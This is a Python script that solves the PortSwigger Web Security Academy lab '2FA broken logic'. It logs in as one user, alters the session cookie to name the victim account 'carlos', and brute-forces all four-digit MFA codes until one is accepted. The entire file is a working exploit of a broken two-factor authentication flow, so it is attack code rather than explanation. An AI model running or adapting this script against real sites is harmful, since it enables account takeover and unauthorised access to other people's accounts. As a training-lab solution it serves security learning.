import sys
import requests

# Portswigger Lab: 2FA broken logic
# Solve without burpsuite pro.
# Change target_url and target_2fa to your lab url!

target_url = "https://something.web-security-academy.net/login"  #Change this
target_2fa = "https://something.web-security-academy.net/login2" #Change this
username = "wiener"
password = "peter"
target_name = "carlos"

session = requests.Session()

post_data = "username=" + username + "&password=" + password
response = session.post(target_url, data=post_data)
headers = response.request.headers
print(headers.get('Cookie').replace(username, target_name))
new_cookie = headers.get('Cookie').replace(username, target_name)
headers.update(Cookie=new_cookie)

session.get(target_2fa, headers=headers)

for code in range(9999):
    num = "0" * (4 - len(str(code))) + str(code)
    post_2fa = "mfa-code=" + num
    print("Try " + post_2fa)
    response = session.post(target_2fa, data=post_2fa, headers=headers)
    if "Incorrect security code" not in response.content.decode():
        print("FOUND 2FA CODE " + num)
        print("Response code ", response.status_code)
        print(response.content.decode())
        sys.exit(0)
    if response.status_code != 200:
        print("Error response status: ", response.status_code)
        sys.exit(0)
